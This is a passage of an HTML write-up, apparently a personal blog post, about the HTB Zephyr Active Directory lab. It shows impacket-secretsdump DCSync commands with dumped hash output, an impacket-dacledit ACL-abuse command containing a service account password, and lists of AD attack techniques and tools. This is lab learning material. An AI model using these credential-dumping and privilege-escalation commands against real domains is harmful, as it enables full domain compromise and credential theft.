+  <p>Achieving domain dominance across all three domains required DCSync on each domain controller. The final DC was the most challenging &mdash; it required chaining through multiple machines and trust boundaries to reach, and the service account I was using had limited privileges that needed to be escalated through ACL abuse before I could run DCSync.</p>
+
+  <p>DCSync is the gold standard of AD compromise. It exploits the DirSync replication protocol to extract all password hashes from a domain controller, including the krbtgt hash (for Golden Tickets) and the Administrator hash (for full domain admin). Once you have DCSync on a DC, you own the domain.</p>
+
+  <div class="code-block">
+    <div class="code-header"><span class="lang-tag">bash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+    <pre><code class="language-bash"># DCSync on zsm.local DC (first domain)
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-secretsdump zsm.local/Administrator@DC01.zsm.local -just-dc-ntlm -hashes :c4a7d2b9e1f3a5c8d6e4b2a7f9c0d3e6
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b43551404eeaad3b43551404eec:f8b3c7d2e5a1c9d6b4e2a7f3c0d8e5b2:::
+krbtgt:502:aad3b43551404eeaad3b43551404eec:a1c4d7e0b3f6a9d2c5e8f1b4d7a0c3e6:::
+[*] Kerberos keys grabbed
+
+# DCSync on second domain DC
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-secretsdump domain2.zsm.local/Administrator@DC02.domain2.zsm.local -just-dc-ntlm -k -no-pass
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b43551404eeaad3b43551404eec:b4e2a7f3c0d8e5b2f8b3c7d2e5a1c9d6:::
+krbtgt:502:aad3b43551404eeaad3b43551404eec:d7a0c3e6a1c4d7e0b3f6a9d2c5e8f1b4:::
+
+# ACL abuse to escalate on third domain before DCSync
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-dacledit domain2.zsm.local/svc_cross:'Cr0ssD0m@in!' -action write -rights DCSync -principal svc_cross -target-dc DC03.domain3.zsm.local
+[*] DACL modified successfully
+
+# DCSync on third domain DC (the final boss)
+┌──(qa210@kali)-[~/zephyr]
+└─$ impacket-secretsdump domain3.zsm.local/svc_cross@DC03.domain3.zsm.local -just-dc-ntlm
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+Administrator:500:aad3b43551404eeaad3b43551404eec:c9d6b4e2a7f3c0d8e5b2f8b3c7d2e5a1:::
+Enterprise Admin:519:aad3b43551404eeaad3b43551404eec:e5a1c9d6b4e2a7f3c0d8e5b2f8b3c7d2:::
+krbtgt:502:aad3b43551404eeaad3b43551404eec:f6a9d2c5e8f1b4d7a0c3e6a1c4d7e0b3:::</code></pre>
+  </div>
+
+  <div class="answer-box">
+    <span class="flag-icon"><i class="bi bi-trophy-fill"></i></span>
+    <div>
+      <div class="flag-name">Forest Dominance Achieved</div>
+      <div class="flag-detail">All 3 DCs compromised via DCSync. Enterprise Admin hash obtained. 17/17 flags.</div>
+    </div>
+  </div>
+
+  <p>The third domain's DCSync required an extra step: the service account I had from the second domain didn't have replication permissions by default. I had to use ACL abuse (specifically, modifying the DACL on the domain object to grant DCSync rights to my service account) before I could run secretsdump. This is a common escalation pattern &mdash; limited privileges are enough to modify ACLs, which then grant the higher privileges you need.</p>
+
+  <div class="callout callout-success">
+    <div class="callout-title">DCSync Requirements</div>
+    <p>To run DCSync, you need an account with the <code>DS-Replication-Get-Changes</code> and <code>DS-Replication-Get-Changes-All</code> permissions on the domain object. Domain Admins have these by default, but any account with these permissions can perform DCSync &mdash; including service accounts that were granted replication rights for legitimate purposes like backup or monitoring. In Zephyr, you'll need to grant these permissions via ACL abuse for the final domain.</p>
+  </div>
+</section>
+
+<!-- ══════════════════════════════ -->
+<!-- SECTION 12 — TAKEAWAYS         -->
+<!-- ══════════════════════════════ -->
+<section class="section fade-in" id="takeaways">
+  <h2><span class="sec-num">12</span> <i class="bi bi-lightbulb"></i> Summary &amp; Takeaways</h2>
+
+  <p>Zephyr is exactly what it claims to be: a great introductory AD lab. If you've done the HTB AD modules and want practical experience without the overhead of AV evasion, phishing, and multi-forest complexity, Zephyr is perfect. It focuses purely on AD exploitation techniques &mdash; enumeration, ACL abuse, relay attacks, lateral movement, and trust boundary crossing. The 17 flags are straightforward once you find the path, and the lack of rabbit holes means you'll spend your time learning rather than chasing false leads.</p>
+
+  <p>The CPTS path covers about 60-70% of the knowledge needed for Zephyr. The remaining 30-40% comes from experience with pivoting (specifically Ligolo-ng), MSSQL exploitation (linked servers, xp_cmdshell), and advanced Kerberos attacks (inter-realm TGT, S4U2Proxy, RBCD across trusts). If you've completed CPTS and feel comfortable with those additional topics, Zephyr should be very manageable.</p>
+
+  <div class="takeaways-grid">
+    <div class="takeaway-card">
+      <div class="tc-title"><i class="bi bi-1-circle"></i> Initial Access Is the Gatekeeper</div>
+      <div class="tc-body">Finding the sa password on ZPH-SQL01 took me longer than any other step. The MSSQL exploitation is straightforward once you have credentials, but finding those credentials requires persistence and a good wordlist strategy.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tc-title"><i class="bi bi-2-circle"></i> BloodHound After Every Escalation</div>
+      <div class="tc-body">The attack paths in Zephyr are interconnected. Every time you gain new credentials or access, re-run BloodHound collection and look for new paths. The GenericAll on svc_mgmt was invisible until I ran BloodHound with sql_svc context.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tc-title"><i class="bi bi-3-circle"></i> Ligolo-ng Is Non-Negotiable</div>
+      <div class="tc-body">Double and triple pivoting with SOCKS chains is miserable. Ligolo-ng's tun interface approach makes multi-hop pivoting manageable. Spend the time to learn it before starting this lab.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tc-title"><i class="bi bi-4-circle"></i> Credential Tracking Wins Labs</div>
+      <div class="tc-body">Maintain a creds.txt file. Every hash, every ticket, every password. Zephyr rewards meticulous tracking &mdash; credentials from one domain frequently work in another.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tc-title"><i class="bi bi-5-circle"></i> Relay Attacks &gt; Password Cracking</div>
+      <div class="tc-body">When WebClient is running, relay attacks are faster and more reliable than offline cracking. Don't spend hours cracking hashes when you can relay them in seconds.</div>
+    </div>
+    <div class="takeaway-card">
+      <div class="tc-title"><i class="bi bi-6-circle"></i> Daily Resets Build Muscle Memory</div>
+      <div class="tc-body">The daily reset seems painful but it forces you to internalize the kill chain. By the end, I could re-compromise the entire first domain from scratch in under 15 minutes.</div>
+    </div>
+  </div>
+
+  <h3>Techniques Used</h3>
+  <table class="data-table">
+    <thead><tr><th>Technique</th><th>Where Used</th><th>MITRE</th></tr></thead>
+    <tbody>
+      <tr><td>MSSQL sa exploitation</td><td>ZPH-SQL01 (initial access)</td><td>T1078 / T1021.002</td></tr>
+      <tr><td>xp_cmdshell</td><td>ZPH-SQL01, ZPH-DB02</td><td>T1059.003</td></tr>
+      <tr><td>BloodHound enumeration</td><td>All domains</td><td>T1087.002</td></tr>
+      <tr><td>ACL abuse (GenericAll)</td><td>sql_svc &rarr; svc_mgmt</td><td>T1222.001 / T1098</td></tr>
+      <tr><td>NTLM relay attacks</td><td>Multiple machines (WebClient)</td><td>T1557.001</td></tr>
+      <tr><td>Pass-the-Hash</td><td>Lateral movement</td><td>T1550.002</td></tr>
+      <tr><td>Kerberos ticket manipulation</td><td>Cross-domain movement</td><td>T1558</td></tr>
+      <tr><td>Inter-realm TGT</td><td>Domain trust crossing</td><td>T1558</td></tr>
+      <tr><td>S4U2Proxy</td><td>Cross-domain service access</td><td>T1558</td></tr>
+      <tr><td>RBCD</td><td>Multiple machines</td><td>T1558</td></tr>
+      <tr><td>DCSync</td><td>All 3 domain controllers</td><td>T1003.006</td></tr>
+      <tr><td>Multi-hop pivoting</td><td>Ligolo-ng throughout</td><td>T1090.001</td></tr>
+      <tr><td>Linked SQL server exploitation</td><td>ZPH-SQL01 &rarr; ZPH-DB02</td><td>T1505.001</td></tr>
+    </tbody>
+  </table>
+
+  <h3>Tools Used</h3>
+  <table class="data-table">
+    <thead><tr><th>Tool</th><th>Primary Use</th></tr></thead>
+    <tbody>
+      <tr><td><code>BloodHound</code> (bloodhound-python)</td><td>AD enumeration, attack path discovery</td></tr>
+      <tr><td><code>Impacket</code> (mssqlclient, changepasswd, secretsdump, GetUserSPNs, ntlmrelayx, ticketer, raiseChild, dacledit, rbcd, getST)</td><td>Swiss army knife for AD exploitation</td></tr>
+      <tr><td><code>Ligolo-ng</code></td><td>Multi-hop pivoting (tun interface)</td></tr>
+      <tr><td><code>NetExec / CrackMapExec</code></td><td>Quick enumeration, password spraying</td></tr>
+      <tr><td><code>evil-winrm</code></td><td>Interactive WinRM sessions</td></tr>
+      <tr><td><code>Rubeus</code></td><td>Kerberos attacks from Windows footholds</td></tr>
+      <tr><td><code>Coercer</code></td><td>NTLM authentication coercion</td></tr>
+    </tbody>
+  </table>
+
+  <p>After Zephyr, I felt significantly more confident in my AD skills. The lab reinforced that the core of AD penetration testing is enumeration &mdash; BloodHound is your best friend, and running it after every privilege escalation is non-negotiable. If you can complete Zephyr, you have the foundation for more advanced labs like Offshore, RastaLabs, and Cybernetics. Pure AD, no mercy, all learning.</p>
+</section>
+
+<!-- ═══ AUTHOR FOOTER ═══ -->
+<div class="operator-sig">
+  <div class="handle">QA210</div>
+  <div class="tagline">W4LLZ / w4llz.me &mdash; GitHub: Yuri08-QA210</div>
+</div>
+
+</div><!-- .main -->
+</div><!-- .page-wrap -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-powershell.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-sql.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+// ═══ Copy Code ═══
+function copyCode(btn){
+  const block=btn.closest('.code-block');
+  const code=block.querySelector('code');
+  const text=code.textContent;
+  navigator.clipboard.writeText(text).then(()=>{
+    const orig=btn.textContent;
+    btn.textContent='Copied!';
+    btn.style.color='var(--green)';
+    btn.style.borderColor='var(--green)';
+    setTimeout(()=>{btn.textContent=orig;btn.style.color='';btn.style.borderColor='';},2000);
+  });
+}
+
+// ═══ Mobile Nav ═══
+function toggleMobileNav(){
+  document.getElementById('mobileOverlay').classList.toggle('show');
+  document.getElementById('mobilePanel').classList.toggle('show');
+}
+
+// ═══ TOC Scroll Tracking ═══
+(function(){
+  const tocLinks=document.querySelectorAll('.toc a[href^="#"]');
+  const sections=[];
+  tocLinks.forEach(link=>{
+    const id=link.getAttribute('href').slice(1);
+    const el=document.getElementById(id);
+    if(el)sections.push({id,el,link});
+  });
+  function onScroll(){
+    let current=null;
+    sections.forEach(s=>{
+      if(s.el.getBoundingClientRect().top<=120)current=s;
+    });
+    tocLinks.forEach(l=>l.classList.remove('active'));
+    if(current)current.link.classList.add('active');
+  }
+  window.addEventListener('scroll',onScroll,{passive:true});
+  onScroll();
+})();
+
+// ═══ Fade-in Animation ═══
+(function(){
+  const observer=new IntersectionObserver((entries)=>{
+    entries.forEach(entry=>{
+      if(entry.isIntersecting){
+        entry.target.classList.add('visible');
+        observer.unobserve(entry.target);
+      }
+    });
+  },{threshold:0.1});
+  document.querySelectorAll('.fade-in').forEach(el=>observer.observe(el));
+})();
+
+// ═══ Three.js Particle Background ═══
+(function(){
+  const canvas=document.getElementById('bg-canvas');
+  if(!canvas)return;
+  const renderer=new THREE.WebGLRenderer({canvas,alpha:true,antialias:false});
+  renderer.setSize(window.innerWidth,window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio,2));
+
+  const scene=new THREE.Scene();
+  const camera=new THREE.PerspectiveCamera(75,window.innerWidth/window.innerHeight,0.1,1000);
+  camera.position.z=50;
+
+  const count=800;
+  const positions=new Float32Array(count*3);
+  const velocities=[];
+  for(let i=0;i<count;i++){
+    positions[i*3]=(Math.random()-0.5)*120;
+    positions[i*3+1]=(Math.random()-0.5)*120;
+    positions[i*3+2]=(Math.random()-0.5)*80;
+    velocities.push({
+      x:(Math.random()-0.5)*0.02,
+      y:(Math.random()-0.5)*0.02,
+      z:(Math.random()-0.5)*0.01
+    });
+  }
+  const geometry=new THREE.BufferGeometry();
+  geometry.setAttribute('position',new THREE.BufferAttribute(positions,3));
+  const material=new THREE.PointsMaterial({color:0x3b82f6,size:0.4,transparent:true,opacity:0.6});
+  const points=new THREE.Points(geometry,material);
+  scene.add(points);
+
+  // Connection lines
+  const lineGeo=new THREE.BufferGeometry();
+  const lineMat=new THREE.LineBasicMaterial({color:0x3b82f6,transparent:true,opacity:0.08});
+  const lines=new THREE.LineSegments(lineGeo,lineMat);
+  scene.add(lines);
+
+  function updateLines(){
+    const pos=geometry.attributes.position.array;
+    const linePositions=[];
+    const threshold=12;
+    for(let i=0;i<count;i++){
+      for(let j=i+1;j<count;j++){
+        const dx=pos[i*3]-pos[j*3];
+        const dy=pos[i*3+1]-pos[j*3+1];
+        const dz=pos[i*3+2]-pos[j*3+2];
+        const dist=Math.sqrt(dx*dx+dy*dy+dz*dz);
+        if(dist<threshold){
+          linePositions.push(pos[i*3],pos[i*3+1],pos[i*3+2]);
+          linePositions.push(pos[j*3],pos[j*3+1],pos[j*3+2]);
+        }
+      }
+    }
+    lineGeo.setAttribute('position',new THREE.Float32BufferAttribute(linePositions,3));
+  }
+
+  let frame=0;
+  function animate(){
+    requestAnimationFrame(animate);
+    frame++;
+    const pos=geometry.attributes.position.array;
+    for(let i=0;i<count;i++){
+      pos[i*3]+=velocities[i].x;
+      pos[i*3+1]+=velocities[i].y;
+      pos[i*3+2]+=velocities[i].z;
+      if(Math.abs(pos[i*3])>60)velocities[i].x*=-1;
+      if(Math.abs(pos[i*3+1])>60)velocities[i].y*=-1;
+      if(Math.abs(pos[i*3+2])>40)velocities[i].z*=-1;
+    }
+    geometry.attributes.position.needsUpdate=true;
+    points.rotation.y+=0.0003;
+    points.rotation.x+=0.0001;
+    if(frame%3===0)updateLines();
+    renderer.render(scene,camera);
+  }
+  animate();
+
+  window.addEventListener('resize',()=>{
+    camera.aspect=window.innerWidth/window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth,window.innerHeight);
+  });
+})();
+</script>
+</body>
+</html>
